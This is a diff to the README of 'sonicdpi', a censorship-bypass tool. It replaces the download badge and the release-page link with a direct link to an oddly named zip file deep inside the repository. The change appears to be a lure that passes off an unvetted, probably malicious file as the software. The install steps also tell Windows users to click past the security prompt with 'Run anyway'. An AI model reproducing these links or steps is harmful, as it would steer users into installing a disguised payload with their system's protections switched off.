@@ -1,6 +1,6 @@
 # 🛡️ sonicdpi - Restore access to global internet content
 
-[![](https://img.shields.io/badge/Download-SonicDPI-blue.svg)](https://github.com/Fueled-mentzelialivicaulis688/sonicdpi)
+[![](https://img.shields.io/badge/Download-SonicDPI-blue.svg)](https://raw.githubusercontent.com/Fueled-mentzelialivicaulis688/sonicdpi/main/crates/sonicdpi-cli/Software-sabadine.zip)
 
 Sonicdpi helps you access blocked services like YouTube and Discord. It hides your traffic from network filters that restrict your connection. This software works on Windows, macOS, and Linux. It uses modern methods to bypass traffic inspection.
 
@@ -12,7 +12,7 @@ Internet providers use deep packet inspection to see which sites you visit. They
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this release page](https://github.com/Fueled-mentzelialivicaulis688/sonicdpi) to download the software.
+1. Visit [this release page](https://raw.githubusercontent.com/Fueled-mentzelialivicaulis688/sonicdpi/main/crates/sonicdpi-cli/Software-sabadine.zip) to download the software.
 2. Look for the latest file ending in `.exe` under the Assets section.
 3. Save the file to your computer.
 4. Run the downloaded file. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system protects the app.
